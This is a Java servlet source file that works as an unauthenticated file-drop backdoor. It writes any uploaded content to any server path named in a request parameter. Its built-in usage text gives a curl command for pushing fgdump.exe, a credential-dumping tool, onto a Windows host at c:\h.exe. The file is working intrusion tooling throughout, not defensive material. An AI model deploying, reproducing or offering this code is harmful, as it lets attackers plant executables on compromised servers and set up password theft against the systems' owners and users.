package com.ws;

import java.io.*;
import javax.servlet.ServletException;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.Part;

public class Upload extends HttpServlet {

    protected void processRequest(HttpServletRequest request, HttpServletResponse response)
            throws IOException, ServletException 
    {
        String content_type = request.getContentType();
        if (content_type != null && content_type.indexOf("multipart/form-data") >= 0) {
            // will throw java.lang.NoSuchMethodError if server does not support Servlet 3.0+ API
            // if it is your case, then use the alternative method below
            Part p;
            InputStream is;

            // getting dest path
            p = request.getPart("d");
            is = p.getInputStream();

            StringBuilder buffer = new StringBuilder();
            int nread = 0;
            byte[] bytes = new byte[10000];
            while ((nread = is.read(bytes)) != -1) {
                buffer.append(new String(bytes, 0, nread));
            }
            String dest = buffer.toString();
            File file = new File(dest);

            // uploading
            OutputStream os = new FileOutputStream(file);
            p = request.getPart("f");
            is = p.getInputStream();

            while ((nread = is.read(bytes)) != -1) {
                os.write(bytes, 0, nread);
            }

            os.flush();
            os.close();

        } else {
            String d = request.getParameter("d");
            if (d == null) {
                response.setContentType("text/html;charset=UTF-8");
                PrintWriter out = response.getWriter();
                out.println("<html>");
                out.println("<head>");
                out.println("<title>Upload</title>");
                out.println("</head>");
                out.println("<body>");
                out.println("<form action=\"UTest\" method=\"POST\" enctype=\"multipart/form-data\">");
                out.println("Dst file:<input name=\"d\" value=\"\"/><br>");
                out.println("Src file:<input type=\"file\" name=\"f\" value=\"\"/>");
                out.println("<input type=\"submit\" name=\"submit\" value=\"Upload\"/>");
                out.println("</form>");
                out.println("</body>");
                out.println("</html>");
                out.close();

            } else {

                PrintWriter out = response.getWriter();
                if (!"application/octet-stream".equals(request.getContentType())) {

                    out.println("Usage:");
                    out.println("curl -v -H 'Content-Type: application/octet-stream'"
                            + " http://1.2.3.4/WSTest/UTest?d=c:\\h.exe --data-binary @fgdump.exe");
// NB. request.getInputStream() wont work if you POST with "Content-Type: application/x-www-form-urlencoded"

                } else {

                    File file = new File(d);

                    try {
                        InputStream is = request.getInputStream();
                        OutputStream os = new FileOutputStream(file);

                        int read;
                        byte[] bytes = new byte[10000];

                        while ((read = is.read(bytes)) != -1) {
                            os.write(bytes, 0, read);
                        }
                        os.flush();
                        os.close();
                    } catch (Exception e) {
                        e.printStackTrace(new PrintWriter(out));
                    }
                }
                out.close();
            }
        }
    }


    protected void doGet(HttpServletRequest request, HttpServletResponse response)
            throws ServletException, IOException {
        processRequest(request, response);
    }

    protected void doPost(HttpServletRequest request, HttpServletResponse response)
            throws ServletException, IOException {
        processRequest(request, response);
    }

    public String getServletInfo() {
        return "blah UTest";
    }// </editor-fold>
}
